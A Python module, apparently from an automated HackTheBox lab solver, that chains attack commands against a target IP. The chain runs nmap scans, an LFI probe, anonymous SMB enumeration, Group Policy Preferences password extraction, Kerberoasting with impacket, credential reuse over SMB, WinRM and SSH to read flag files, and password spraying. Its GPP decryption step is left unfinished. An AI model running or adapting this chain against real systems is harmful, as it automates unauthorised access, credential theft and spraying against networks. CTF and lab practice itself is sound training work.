"""Automatic HTB playbook. Never returns a repeating echo."""
from __future__ import annotations

from pathlib import Path

from core.lfi_probe import probe_command

STOP = ("__STOP__", "stop")


class LabPlaybook:
    def __init__(self, ip: str, workdir: Path):
        self.ip = ip
        self.work = workdir
        self.scans = workdir / "scans"
        self.loot = workdir / "loot"
        self.scans.mkdir(parents=True, exist_ok=True)
        self.loot.mkdir(parents=True, exist_ok=True)

    def _done(self, history: list, needle: str) -> bool:
        return any(needle in (h.get("command") or "") for h in history)

    def _scan_text(self) -> str:
        for name in ("version_scan.txt", "quick_scan.txt"):
            p = self.scans / name
            if p.exists():
                return p.read_text(errors="ignore")
        return ""

    def next_action(self, state: dict) -> tuple[str, str]:
        history = state.get("history", [])
        creds = state.get("credentials") or []
        users_file = self.loot / "users.txt"
        pass_file = self.loot / "passwords.txt"
        scan = self._scan_text()
        ip = self.ip
        ad = any(x in scan for x in ("88/tcp", "389/tcp", "445/tcp", "kerberos", "microsoft-ds"))
        really_web = any(
            line.split()[0].startswith(("80/tcp", "443/tcp", "8080/tcp")) and " open " in line
            for line in scan.splitlines()
            if "/tcp" in line
        )
        web = really_web
        winrm = "5985/tcp" in scan
        ssh = "22/tcp" in scan
        domain = state.get("domain") or "active.htb"

        if not (self.scans / "quick_scan.txt").exists():
            return (f"nmap -Pn -T4 --top-ports 200 -sV --open -oN {self.scans}/quick_scan.txt {ip}", "recon")
        if not (self.scans / "version_scan.txt").exists():
            return (f"nmap -Pn -sC -sV -p- --min-rate 800 -oN {self.scans}/version_scan.txt {ip}", "recon")

        if web and not self._done(history, "LFI probe"):
            return (probe_command(ip, self.loot), "enum")

        if ad and not self._done(history, "-u '' -p '' --shares"):
            return (f"nxc smb {ip} -u '' -p '' --shares", "enum")
        if ad and not self._done(history, "gpp_password"):
            return (
                f"nxc smb {ip} -u '' -p '' -M gpp_password | tee {self.loot}/gpp_nxc.txt; "
                f"nxc smb {ip} -u guest -p '' -M gpp_password | tee -a {self.loot}/gpp_nxc.txt || true",
                "enum",
            )
        if ad and not self._done(history, "GPP_FETCH_ALL"):
            dest = self.loot / "replication"
            return (
                f"echo GPP_FETCH_ALL; mkdir -p {dest}; "
                f"smbclient -U '%' -N //{ip}/Replication -c 'recurse ON; prompt OFF; lcd {dest}; mget *' 2>&1 | tee {self.loot}/repl_full.txt; "
                f"find {dest} -iname Groups.xml | tee {self.loot}/gpp_files.txt; "
                f"if command -v gpp-decrypt >/dev/null; then "
                f"grep -oE 'cpassword=\"[^\"]+' {dest}/*/../../* 2>/dev/null; "
                f"find {dest} -iname Groups.xml -exec grep -oE 'cpassword=\"[^\"]+' {{}} \; ; fi",
                "exploit",
            )
        if ad and not self._done(history, "GPP_DECRYPT"):
            return (
                f"echo GPP_DECRYPT; find {self.loot} -iname Groups.xml -print -exec cat {{}} \; | tee {self.loot}/groups_dump.txt; "
                f"python3 - <<'PY'\n"
                f"from pathlib import Path\n"
                f"import re,base64\n"
                f"print('xmls', list(Path('{self.loot}').rglob('Groups.xml')))\n"
                f"PY",
                "exploit",
            )

        if creds:
            u, p = creds[0].get("username"), creds[0].get("password")
            if u and p:
                if not any(f"-u '{u}'" in (h.get("command") or "") and "--shares" in (h.get("command") or "") for h in history):
                    return (f"nxc smb {ip} -u '{u}' -p '{p}' --shares", "enum")
                if not self._done(history, "GetUserSPNs"):
                    return (
                        f"impacket-GetUserSPNs {domain}/{u}:'{p}' -dc-ip {ip} -request || true",
                        "exploit",
                    )
                if not self._done(history, f"//{ip}/Users"):
                    return (
                        f"smbclient -U '{u}%{p}' //{ip}/Users -c 'recurse ON; prompt OFF; lcd {self.loot}; mget *user.txt' || true",
                        "loot",
                    )
                if winrm and not self._done(history, "user.txt"):
                    return (
                        f"nxc winrm {ip} -u '{u}' -p '{p}' -x \"cmd /c type C:\\Users\\*\\Desktop\\user.txt\"",
                        "loot",
                    )
                if ssh and not self._done(history, "cat ~/user.txt"):
                    return (
                        f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no {u}@{ip} 'cat ~/user.txt 2>/dev/null'",
                        "loot",
                    )

        if users_file.exists() and pass_file.exists() and pass_file.stat().st_size > 0:
            if not self._done(history, "--continue-on-success"):
                return (f"nxc smb {ip} -u {users_file} -p {pass_file} --continue-on-success", "spray")

        return STOP
